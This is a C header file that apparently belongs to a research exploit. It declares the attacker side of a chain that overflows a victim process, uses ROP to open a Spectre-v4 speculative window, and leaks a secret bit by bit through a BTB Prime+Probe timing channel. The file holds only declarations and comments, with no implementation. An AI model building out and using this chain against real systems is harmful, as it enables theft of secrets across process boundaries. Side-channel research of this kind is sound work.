// The leak: a BTB Prime+Probe channel that reads the victim's secret one bit at a time. Each shot
// delivers the overflow, the ROP opens a Spectre-v4 window and speculatively branches to a target
// whose canonicality carries one secret bit. A canonical target allocates a BTB entry the attacker
// then detects by timing.
#ifndef ATTACKER_H
#define ATTACKER_H
#include <stdint.h>
#include <sys/types.h>

void attacker_set_samples(int n);                  // prime/probe iterations averaged per bit
void attacker_setup(int transmit_set, int tail_set);
void attacker_bind_victim(pid_t pid, int stdin_wfd);
int  attacker_crashed(int *killsig);               // reap + report whether the victim died

// Decide one secret bit: x0 = address of the secret word, bit = which bit, calib_x0 = a
// known-canonical reference word the 3-way readout normalizes against. Returns 0 or 1.
int  leak_bit(uint64_t x0, uint64_t bit, uint64_t calib_x0);

// Confidence of the last leak_bit decision, in [0,1]. A low value marks a thin-margin bit.
double attacker_bit_margin(void);

#endif
